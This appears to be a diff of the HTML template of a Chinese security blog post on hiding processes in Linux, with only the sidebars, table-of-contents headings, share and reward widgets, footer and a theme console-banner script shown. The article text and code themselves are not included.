class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E6%9F%A5%E7%9C%8B"><span class="toc-number">2.</span> <span class="toc-text">进程查看</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B%EF%BC%88%E7%94%A8%E6%88%B7%E6%80%81%EF%BC%89"><span class="toc-number">3.</span> <span class="toc-text">隐藏进程（用户态）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%9B%BF%E6%8D%A2"><span class="toc-number">3.1.</span> <span class="toc-text">命令替换</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%90%E8%97%8F-proc-pid"><span class="toc-number">3.2.</span> <span class="toc-text">隐藏&#x2F;proc&#x2F;pid</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ring3%E5%8A%AB%E6%8C%81lib%E5%BA%93"><span class="toc-number">3.3.</span> <span class="toc-text">Ring3劫持lib库</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B%EF%BC%88%E5%86%85%E6%A0%B8%E6%80%81%EF%BC%89"><span class="toc-number">4.</span> <span class="toc-text">隐藏进程（内核态）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Ring1%E5%8A%AB%E6%8C%81VFS"><span class="toc-number">4.1.</span> <span class="toc-text">Ring1劫持VFS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%AB%E6%8C%81%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8"><span class="toc-number">4.2.</span> <span class="toc-text">劫持系统调用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%93%BE%E8%A1%A8%E6%91%98%E9%99%A4"><span class="toc-number">4.3.</span> <span class="toc-text">链表摘除</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E8%AF%AD"><span class="toc-number">5.</span> <span class="toc-text">结语</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/huanhuan/2024/07/09/CC%E9%93%BE%E5%AD%A6%E4%B9%A0/" title="CC链学习">CC链学习</a><time datetime="2024-07-08T16:00:00.000Z" title="Created 2024-07-09 00:00:00">2024-07-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/huanhuan/2024/07/05/GeoServer%20Jxpath%20RCE/" title="GeoServer Jxpath RCE">GeoServer Jxpath RCE</a><time datetime="2024-07-04T16:00:00.000Z" title="Created 2024-07-05 00:00:00">2024-07-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/huanhuan/2024/06/20/Linux%E4%B8%8B%E7%9A%84%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B/" title="Linux下的隐藏进程">Linux下的隐藏进程</a><time datetime="2024-06-19T16:00:00.000Z" title="Created 2024-06-20 00:00:00">2024-06-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/huanhuan/2024/05/28/%E4%BB%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%B0%E5%86%85%E6%A0%B8%E9%A9%AC%E5%88%B0Rookit/" title="从内存马到内核马">从内存马到内核马</a><time datetime="2024-05-27T16:00:00.000Z" title="Created 2024-05-28 00:00:00">2024-05-28</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent;"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2024 By huanhuan</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/huanhuan/js/utils.js"></script><script src="/huanhuan/js/main.js"></script><div class="js-pjax"></div><script src="/huanhuan/js/modify.js"></script><script type="text/javascript" src ="/huanhuan/js/reward.js" ></script><script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.6.16/dist/sweetalert2.all.min.js"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start --><script async data-pjax src="https://npm.elemecdn.com/hexo-anzhiyu-music@1.0.2/assets/js/music.js"></script><!-- hexo injector body_end end --></body></html>
+</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/huanhuan/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">huanhuan</div><div class="post-copyright__author_desc">Huanhuan の Blog</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="https://w-lovezz.github.io/huanhuan/2024/06/20/Linux%E4%B8%8B%E7%9A%84%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('https://w-lovezz.github.io/huanhuan/2024/06/20/Linux%E4%B8%8B%E7%9A%84%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B/')">Linux下的隐藏进程</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"><div class="post-reward" onclick="anzhiyu.addRewardMask()"><div class="reward-button button--animated" title="赞赏作者"><i class="anzhiyufont anzhiyu-icon-hand-heart-fill"></i>打赏作者</div><div class="reward-main"><div class="reward-all"><span class="reward-title">感谢你赐予我前进的力量</span><ul class="reward-group"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul><a class="reward-main-btn" href="/about/#about-reward" target="_blank"><div class="reward-text">赞赏者名单</div><div class="reward-dec">因为你们的支持让我意识到写文章的价值🙏</div></a></div></div></div><div id="quit-box" onclick="anzhiyu.removeRewardMask()" style="display: none"></div></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="https://w-lovezz.github.io/huanhuan/2024/06/20/Linux%E4%B8%8B%E7%9A%84%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=Linux下的隐藏进程&amp;url=https://w-lovezz.github.io/huanhuan/2024/06/20/Linux%E4%B8%8B%E7%9A%84%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
+  var currentPageUrl = window.location.href;
+  var input = document.createElement("input");
+  input.setAttribute("value", currentPageUrl);
+  document.body.appendChild(input);
+  input.select();
+  input.setSelectionRange(0, 99999);
+  document.execCommand("copy");
+  document.body.removeChild(input);
+}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://w-lovezz.github.io/huanhuan" target="_blank">Huanhuan の Blog</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/huanhuan/tags/%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>隐藏进程<span class="tagsPageCount">1</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/huanhuan/2024/05/28/%E4%BB%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%B0%E5%86%85%E6%A0%B8%E9%A9%AC%E5%88%B0Rookit/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/huanhuan/" onerror="onerror=null;src='/huanhuan/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">从内存马到内核马</div></div></a></div><div class="next-post pull-right"><a href="/huanhuan/2024/07/05/GeoServer%20Jxpath%20RCE/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/huanhuan/" onerror="onerror=null;src='/huanhuan/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">GeoServer Jxpath RCE</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" onerror="this.onerror=null;this.src='/huanhuan/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__description"></div></div></div><div class="card-widget anzhiyu-right-widget" id="card-wechat" onclick="null"><div id="flip-wrapper"><div id="flip-content"><div class="face" style="background: url(https://bu.dusays.com/2023/01/13/63c02edf44033.png) center center / 100% no-repeat"></div><div class="back face" style="background: url(https://bu.dusays.com/2023/05/13/645fa415e8694.png) center center / 100% no-repeat"></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E6%9F%A5%E7%9C%8B"><span class="toc-number">2.</span> <span class="toc-text">进程查看</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B%EF%BC%88%E7%94%A8%E6%88%B7%E6%80%81%EF%BC%89"><span class="toc-number">3.</span> <span class="toc-text">隐藏进程（用户态）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%9B%BF%E6%8D%A2"><span class="toc-number">3.1.</span> <span class="toc-text">命令替换</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%90%E8%97%8F-proc-pid"><span class="toc-number">3.2.</span> <span class="toc-text">隐藏&#x2F;proc&#x2F;pid</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ring3%E5%8A%AB%E6%8C%81lib%E5%BA%93"><span class="toc-number">3.3.</span> <span class="toc-text">Ring3劫持lib库</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B%EF%BC%88%E5%86%85%E6%A0%B8%E6%80%81%EF%BC%89"><span class="toc-number">4.</span> <span class="toc-text">隐藏进程（内核态）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Ring1%E5%8A%AB%E6%8C%81VFS"><span class="toc-number">4.1.</span> <span class="toc-text">Ring1劫持VFS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%AB%E6%8C%81%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8"><span class="toc-number">4.2.</span> <span class="toc-text">劫持系统调用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%93%BE%E8%A1%A8%E6%91%98%E9%99%A4"><span class="toc-number">4.3.</span> <span class="toc-text">链表摘除</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E8%AF%AD"><span class="toc-number">5.</span> <span class="toc-text">结语</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/huanhuan/2024/07/09/CC%E9%93%BE%E5%AD%A6%E4%B9%A0/" title="CC链学习">CC链学习</a><time datetime="2024-07-08T16:00:00.000Z" title="发表于 2024-07-09 00:00:00">2024-07-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/huanhuan/2024/07/05/GeoServer%20Jxpath%20RCE/" title="GeoServer Jxpath RCE">GeoServer Jxpath RCE</a><time datetime="2024-07-04T16:00:00.000Z" title="发表于 2024-07-05 00:00:00">2024-07-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/huanhuan/2024/06/20/Linux%E4%B8%8B%E7%9A%84%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B/" title="Linux下的隐藏进程">Linux下的隐藏进程</a><time datetime="2024-06-19T16:00:00.000Z" title="发表于 2024-06-20 00:00:00">2024-06-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/huanhuan/2024/05/28/%E4%BB%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%B0%E5%86%85%E6%A0%B8%E9%A9%AC%E5%88%B0Rookit/" title="从内存马到内核马">从内存马到内核马</a><time datetime="2024-05-27T16:00:00.000Z" title="发表于 2024-05-28 00:00:00">2024-05-28</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2024 By <a class="footer-bar-link" href="/huanhuan/" title="huanhuan" target="_blank">huanhuan</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/huanhuan/archives/" title="archive"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/huanhuan/tags/" title="tag"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/huanhuan/categories/" title="category"><div class="headline">分类</div><div class="length-num">0</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/huanhuan/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/huanhuan/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/huanhuan/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/huanhuan/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/huanhuan/fcircle/"><i class="anzhiyufont anzhiyu-icon-artstation faa-tada" style="font-size: 0.9em;"></i><span> 朋友圈</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/huanhuan/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/huanhuan/music/?id=543113542&amp;server=netease"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/huanhuan/album/"><i class="anzhiyufont anzhiyu-icon-images faa-tada" style="font-size: 0.9em;"></i><span> 相册集</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/huanhuan/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/huanhuan/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 闲言碎语</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-shoe-prints1 faa-tada" style="font-size: 0.9em;"></i><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/huanhuan/tags/CC%E9%93%BE/" style="font-size: 0.88rem;">CC链<sup>1</sup></a><a href="/huanhuan/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 0.88rem;">Java反序列化<sup>1</sup></a><a href="/huanhuan/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" style="font-size: 0.88rem;">漏洞分析<sup>1</sup></a><a href="/huanhuan/tags/%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B/" style="font-size: 0.88rem;">隐藏进程<sup>1</sup></a><a href="/huanhuan/tags/%E9%A9%AC/" style="font-size: 0.88rem;">马<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/huanhuan/js/utils.js"></script><script src="/huanhuan/js/main.js"></script><script src="/huanhuan/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
+var HoldLog = console.log;
+console.log = function () {};
+let now1 = new Date();
+queueMicrotask(() => {
+  const Log = function () {
+    HoldLog.apply(console, arguments);
+  }; //在恢复前输出日志
+  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
+  now1.setTime(now1.getTime() + 250);
+  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
+  const dnum = Math.floor(days);
+  const ascll = [
+    `欢迎使用安知鱼!`,
+    `生活明朗, 万物可爱`,
+    `
+        
+       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
+      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
+      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
+      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
+      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
+      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
+        
+        `,
+    "已上线",
+    dnum,
+    "天",
+    "©2020 By 安知鱼 V1.6.14",
+  ];
+  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];
+
+  setTimeout(
+    Log.bind(
+      console,
